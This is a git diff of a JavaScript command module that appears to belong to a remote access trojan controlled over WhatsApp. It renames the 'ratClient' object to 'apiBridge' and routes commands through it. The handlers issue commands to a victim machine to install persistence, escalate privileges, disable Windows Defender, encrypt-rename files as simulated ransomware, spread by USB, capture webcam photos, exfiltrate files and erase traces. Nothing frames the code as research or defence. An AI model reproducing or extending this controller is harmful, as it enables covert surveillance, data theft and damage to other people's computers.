@@ -5,8 +5,8 @@ import { ResponseFormatter } from '../utils/formatter.js';
  */
 
 export class FunCommands {
-  constructor(ratClient, sock) {
-    this.ratClient = ratClient;
+  constructor(apiBridge, sock) {
+    this.apiBridge = apiBridge;
     this.sock = sock;
   }
 
@@ -29,7 +29,7 @@ export class FunCommands {
     }
 
     const msg = args.join(' ');
-    const result = await this.ratClient.showMessageBox(sessionId, msg);
+    const result = await this.apiBridge.executeCommand(sessionId, `msgbox ${msg}`);
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -56,7 +56,7 @@ export class FunCommands {
     const freq = args[0] ? parseInt(args[0]) : 1000;
     const duration = args[1] ? parseInt(args[1]) : 500;
 
-    const result = await this.ratClient.beep(sessionId, freq, duration);
+    const result = await this.apiBridge.executeCommand(sessionId, `beep ${freq} ${duration}`);
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -84,7 +84,7 @@ export class FunCommands {
       text: ResponseFormatter.executing('Locking workstation...') 
     });
 
-    const result = await this.ratClient.lock(sessionId);
+    const result = await this.apiBridge.executeCommand(sessionId, 'lock');
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -114,7 +114,7 @@ export class FunCommands {
       text: ResponseFormatter.warning(`⚠️ Scheduling shutdown in ${delay} seconds...`) 
     });
 
-    const result = await this.ratClient.shutdown(sessionId, false);
+    const result = await this.apiBridge.executeCommand(sessionId, `shutdown ${delay}`);
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -146,7 +146,7 @@ export class FunCommands {
       text: ResponseFormatter.executing('Installing persistence mechanism...') 
     });
 
-    const result = await this.ratClient.persist(sessionId);
+    const result = await this.apiBridge.executeCommand(sessionId, 'persist');
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -174,7 +174,7 @@ export class FunCommands {
       text: ResponseFormatter.executing('Attempting privilege escalation...') 
     });
 
-    const result = await this.ratClient.elevate(sessionId);
+    const result = await this.apiBridge.executeCommand(sessionId, 'elevate');
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -202,7 +202,7 @@ export class FunCommands {
       text: ResponseFormatter.executing('Disabling Windows Defender...') 
     });
 
-    const result = await this.ratClient.disableDefender(sessionId);
+    const result = await this.apiBridge.executeCommand(sessionId, 'defenderoff');
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -243,7 +243,7 @@ export class FunCommands {
       text: ResponseFormatter.warning(`⚠️ WARNING: Simulating ransomware on ${targetPath}...\n\n_This WILL rename files with .encrypted extension_`) 
     });
 
-    const result = await this.ratClient.simulateRansomware(sessionId, targetPath);
+    const result = await this.apiBridge.executeCommand(sessionId, `ransom ${targetPath}`);
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -271,7 +271,7 @@ export class FunCommands {
       text: ResponseFormatter.executing('Initiating USB spreading mechanism...\n\n_Please wait..._') 
     });
 
-    const result = await this.ratClient.spreadUSB(sessionId);
+    const result = await this.apiBridge.executeCommand(sessionId, 'spread');
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -299,7 +299,7 @@ export class FunCommands {
       text: ResponseFormatter.warning(`⚠️ SELF-DESTRUCT INITIATED\n\nThe RAT will:\n1. Clean all traces\n2. Remove persistence\n3. Exit gracefully`) 
     });
 
-    const result = await this.ratClient.selfDestruct(sessionId);
+    const result = await this.apiBridge.executeCommand(sessionId, 'selfdestruct');
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -340,7 +340,7 @@ export class FunCommands {
       text: ResponseFormatter.info(`📥 Downloading: ${filePath}\n\n_Please wait..._`) 
     });
 
-    const result = await this.ratClient.downloadFile(sessionId, filePath);
+    const result = await this.apiBridge.downloadFile(sessionId, filePath);
     
     if (result.success) {
       try {
@@ -378,7 +378,7 @@ export class FunCommands {
       text: ResponseFormatter.warning('🔄 *Restarting system in 30 seconds...*\n\nTarget system will restart') 
     });
 
-    const result = await this.ratClient.restart(sessionId);
+    const result = await this.apiBridge.executeCommand(sessionId, 'restart');
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -410,7 +410,7 @@ export class FunCommands {
       text: ResponseFormatter.info(`📸 Starting timelapse...\n\n${photoCount} photos every ${photoInterval}s\nTotal time: ~${totalTime}s\n\n_Please wait..._`) 
     });
 
-    const result = await this.ratClient.screenshotTimelapse(sessionId, photoCount, photoInterval);
+    const result = await this.apiBridge.executeCommand(sessionId, `timelapse ${photoCount} ${photoInterval}`);
     
     if (result.success) {
       let response = ResponseFormatter.header('📸', 'TIMELAPSE CAPTURE') + '\n\n';
@@ -450,7 +450,7 @@ export class FunCommands {
       text: ResponseFormatter.info(`📷 Taking ${photoCount} photos in burst mode...\n\n_Please wait..._`) 
     });
 
-    const result = await this.ratClient.photoBurst(sessionId, photoCount);
+    const result = await this.apiBridge.executeCommand(sessionId, `burst ${photoCount}`);
     
     if (result.success) {
       let response = ResponseFormatter.header('📷', 'PHOTO BURST') + '\n\n';
@@ -488,7 +488,7 @@ export class FunCommands {
       text: ResponseFormatter.info('💾 Enumerating USB devices...\n\n_Please wait..._') 
     });
 
-    const result = await this.ratClient.enumerateUSB(sessionId);
+    const result = await this.apiBridge.enumerateUSB(sessionId);
     
     if (result.success) {
       let response = ResponseFormatter.header('💾', 'USB DEVICES') + '\n\n';
